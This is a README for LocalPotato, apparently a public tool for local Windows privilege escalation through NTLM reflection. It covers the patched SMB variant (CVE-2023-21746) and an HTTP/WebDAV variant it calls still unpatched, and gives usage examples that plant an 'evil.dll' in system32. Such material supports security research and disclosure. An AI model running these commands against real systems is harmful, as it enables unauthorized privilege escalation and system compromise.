# LocalPotato
Another Local Windows privilege escalation using a new potato technique ;)

The LocalPotato attack is a type of NTLM reflection attack that targets local authentication. This attack allows for arbitrary file read/write and elevation of privilege. 

**NOTE: The SMB scenario has been fixed by Microsoft in the January 2023 Patch Tuesday with the [CVE-2023-21746](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2023-21746). If you run this exploit against a patched machine it won't work.** 

More technical details at --> https://www.localpotato.com/localpotato_html/LocalPotato.html

**NOTE2: The HTTP/WebDAV scenario is currently unpatched (Microsoft decision, we reported it) and works on updated systems.** 

More technical details at --> https://decoder.cloud/2023/11/03/localpotato-http-edition/



## Usage

```

         LocalPotato (aka CVE-2023-21746 & HTTP/WebDAV)
         by splinter_code & decoder_it


Mandatory Args:
SMB:
        -i Source file to copy for SMB
        -o Output file for SMB - do not specify the drive letter
HTTP:
        -r host/ip for HTTP
        -u target URL for HTTP

Optional Args:
-c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51})
-p COM server port (Default 10271)

Examples:
- SMB:
         LocalPotato.exe -i c:\hacker\evil.dll -o windows\system32\evil.dll
- HTTP/WebDAV:
         LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local
```

## Demo

- SMB:
![image](https://user-images.githubusercontent.com/19797064/218135881-af046286-c299-4f08-856b-2265adc46e64.png)

- HTTP/WebDAV
![image](https://github.com/decoder-it/LocalPotato/assets/19797064/100db270-e1e2-44db-ae54-91c3a7cb9b15)


## Authors: 
- [@decoder_it](https://twitter.com/decoder_it)
- [@splinter_code](https://twitter.com/splinter_code)
